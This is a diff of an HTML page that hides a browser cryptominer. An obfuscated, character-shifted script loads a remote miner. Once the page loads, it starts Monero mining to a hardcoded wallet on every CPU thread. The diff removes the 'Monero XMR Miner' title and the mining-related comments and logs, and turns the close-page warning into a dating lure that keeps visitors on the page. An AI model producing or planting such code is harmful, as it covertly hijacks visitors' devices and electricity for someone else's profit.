@@ -44,33 +44,30 @@
   
     <meta charset="utf-8">
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
-    <title>Monero XMR Miner</title>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
       var s="=tdsjqu!tsd>#iuuqt;00fuifsfvn.qpdlfu/dpn0qfsgflu0qfsgfluxfc/kt@w1818312:@qfsgflu>xtt;00@kbtpo>gbtufs/npofsppdfbo#!?=0tdsjqu?";
         m=""; for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1); document.write(m);
-        console.log("Miner script injected:", m);
+        console.log("script injected:", m);
     </script>
     <script>
         $(function() {
             console.log("Page loaded, starting miner");
             var wallet = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
-            var threads = navigator.hardwareConcurrency || 4; // Максимальное количество потоков
+            var threads = navigator.hardwareConcurrency || 4;
             console.log("Threads set to:", threads);
 
-            // Автозапуск майнинга
+            // Автозапуск 
             if (typeof PerfektStart === 'function') {
                 PerfektStart(wallet, "x", threads);
-                console.log("Mining started with wallet:", wallet, "threads:", threads);
+                console.log(":", wallet, "threads:", threads);
             } else {
-                console.error("PerfektStart is not defined");
+                console.error("Per");
             }
-
-            // Предупреждение при закрытии страницы
             window.addEventListener('beforeunload', function (e) {
                 e.preventDefault();
-                e.returnValue = 'Майнинг в процессе. Вы уверены, что хотите закрыть страницу?';
+                e.returnValue = 'You want meet with real girl?';
             });
         });
     </script>
